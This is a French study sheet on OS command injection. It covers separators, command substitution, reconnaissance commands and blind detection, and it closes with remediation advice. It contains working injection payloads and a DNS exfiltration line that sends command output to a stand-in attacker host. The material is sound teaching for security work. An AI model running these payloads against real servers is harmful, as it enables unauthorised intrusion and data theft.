# ⚡ Vulnérabilité Web : Injection de Commandes OS (Command Injection)

## 1. Aperçu, Définition & Impacts

- **Définition :** Vulnérabilité permettant à un attaquant d'exécuter des commandes du système d'exploitation sous-jacent sur le serveur hébergeant l'application web.
- **Impacts principaux :**
  - **Compromission totale :** Prise de contrôle du serveur et accès intégral aux données applicatives et système.
  - **Pivotement réseau (Pivoting) :** Attaque des autres équipements du réseau interne via les relations de confiance de l'hôte.
- **OWASP Top 10 :** Classé sous `A03:2021 — Injection`.

!!! info "Distinction avec l'injection de code"
    L'injection de commandes OS exécute une **commande shell** préexistante sur le système (`whoami`, `ls`, `net user`...), à ne pas confondre avec l'injection de code (ex. `eval()` en PHP/Python) qui exécute du **code source** interprété directement par le langage applicatif.

---

## 2. Mécanisme d'Injection & Analyse Technique

- **Cas d'usage applicatif classique :** Consultation de stock via une URL paramétrée (`/stockStatus?productID=381&storeID=29`) exécutant un script sous-jacent :

```bash
stockreport.pl 381 29
```

- **Payload d'injection :** Passage du paramètre pour y insérer une commande secondaire.

```bash
stockreport.pl & echo aiwefwlguh & 29
```

- **Rôle des séparateurs :** L'esperluette (`&`) isole la commande injectée du reste de la ligne de commande.

!!! warning "Remarque d'encodage"
    L'esperluette doit être encodée en `%26` dans les requêtes HTTP GET/POST pour éviter qu'elle ne soit interprétée par le serveur web ou un composant intermédiaire comme un séparateur de paramètres HTTP (`key=value&key2=value2`). Alternatives disponibles selon le contexte : `|`, `;`.

```http
GET /stockStatus?productID=381&storeID=29%26echo%20aiwefwlguh%26 HTTP/1.1
Host: vulnerable-website.com
```

---

## 3. Syntaxe, Opérateurs & Métacaractères d'Injection

### 3.1 Séparateurs / Chaînage conditionnel & inconditionnel

| Opérateur | Comportement |
|---|---|
| `;` | Exécution séquentielle (`Command1 ; Command2`), indépendamment du résultat de la première |
| `&` | Exécution en arrière-plan / isolée (sous Windows, agit comme séparateur séquentiel) |
| `&&` | Exécution si la commande précédente réussit (ET logique) |
| `\|` | Redirection du flux (Pipe) : la sortie de Command1 devient l'entrée de Command2 |
| `\|\|` | Exécution si la commande précédente échoue (OU logique) |
| `\n` / `%0a` | Nouvelle ligne — traitée comme un nouveau segment de commande par de nombreux interpréteurs |

### 3.2 Substitution de commandes

Permet de passer le résultat d'une commande comme argument d'une autre, particulièrement utile quand les séparateurs classiques sont filtrés :

```bash
$(whoami)
`whoami`
```

### 3.3 Sortie de contexte (escaping)

Lorsque l'entrée utilisateur est concaténée à l'intérieur d'une chaîne de caractères quotée côté applicatif, fermer préalablement les guillemets avant d'injecter le métacaractère :

```bash
" ; whoami ; "
' ; whoami ; '
```

---

## 4. Commandes de Reconnaissance Système (Post-Exploitation)

| Objectif | Linux / Unix | Windows |
|---|---|---|
| Utilisateur courant | `whoami` | `whoami` |
| Version du système (OS) | `uname -a` | `ver` |
| Configuration réseau | `ifconfig` / `ip a` | `ipconfig /all` |
| Connexions réseau actives | `netstat -an` | `netstat -an` |
| Processus en cours | `ps -ef` | `tasklist` |
| Arborescence du répertoire | `pwd` / `ls -la` | `cd` / `dir` |
| Comptes locaux | `cat /etc/passwd` | `net user` |
| Privilèges courants | `id` | `whoami /priv` |

!!! tip "Chaînage de reconnaissance"
    Une fois l'injection confirmée, chaîner plusieurs commandes de cartographie en une seule requête réduit le nombre d'allers-retours et le bruit généré dans les logs :
    ```bash
    & whoami && id && uname -a &
    ```

---

## 5. Injections de Commandes Aveugles (Blind Command Injection)

Techniques applicables lorsque la réponse HTTP n'affiche pas directement le retour `stdout`/`stderr` de la commande injectée.

### 5.1 Détection par temporisation (Time-based)

Génération d'une pause serveur mesurable pour confirmer la vulnérabilité, sans dépendre d'un retour visible :

```bash
# Linux
& ping -c 10 127.0.0.1 &
```

```bash
# Windows
& timeout /t 10 &
```

!!! info "Fiabilité du time-based"
    Une latence réseau variable peut fausser l'interprétation. Toujours établir une mesure de référence (baseline) sans payload avant de comparer le délai observé avec injection.

### 5.2 Redirection de la sortie (Output Redirection)

Écriture du résultat de la commande dans un fichier accessible publiquement, puis récupération via une requête HTTP classique :

```bash
& whoami > /var/www/static/whoami.txt &
```

Lecture ultérieure du résultat :

```bash
curl https://vulnerable-website.com/static/whoami.txt
```

### 5.3 Techniques Out-of-Band (OAST / OOB)

**Trigger DNS** — déclenchement d'une résolution DNS vers un serveur contrôlé par l'attaquant (ex : Burp Collaborator) pour confirmer l'exécution aveugle :

```bash
& nslookup kgji2ohoyw.web-attacker.com &
```

**Exfiltration de données via DNS** — concaténation du résultat de la commande interne dans le sous-domaine interrogé, exfiltrant la donnée via le canal DNS :

```bash
& nslookup $(whoami).kgji2ohoyw.web-attacker.com &
```

!!! warning "Pourquoi l'OOB est décisif"
    Les techniques OOB (DNS, HTTP sortant) sont le seul moyen fiable de confirmer une injection de commande totalement aveugle sur un environnement filtrant strictement les sorties (pas de redirection de fichier possible, pas de délai perceptible côté serveur applicatif mutualisé).

---

## 6. Rémediation & Sécurisation

- **Prévention Primaire :** Ne **JAMAIS** faire appel à des commandes du système d'exploitation depuis la couche applicative (`exec()`, `system()`, `passthru()`, `popen()`, `subprocess.Popen(shell=True)`). Privilégier systématiquement les API/bibliothèques natives du langage (manipulation de fichiers, réseau, process via les modules standards sans passage par un shell).

- **Mesures de secours (si l'appel système est réellement inévitable) :**
  - Valider l'entrée utilisateur via une **liste blanche stricte** de valeurs autorisées.
  - Vérifier la nature du type de donnée (ex : s'assurer que le paramètre est **strictement numérique** avant tout passage à un appel système).
  - Restreindre les entrées aux seuls caractères alphanumériques (bloquer explicitement les espaces et l'ensemble des métacaractères shell listés en section 3).
  - Lorsque l'appel système est indispensable, privilégier les fonctions d'exécution qui **n'invoquent pas d'interpréteur shell** et acceptent un tableau d'arguments séparés (ex. `execve()`/`subprocess.run([...], shell=False)`), empêchant structurellement l'interprétation des métacaractères.

!!! warning "Pratique à proscrire"
    Ne jamais tenter de nettoyer/échapper manuellement les métacaractères du shell. C'est une approche complexe, sujette aux oublis (encodages, substitutions de commandes, sauts de ligne) et **systématiquement contournable** — l'historique des vulnérabilités de ce type en est la démonstration constante. La liste blanche stricte et l'absence totale d'invocation shell restent les seules défenses robustes.
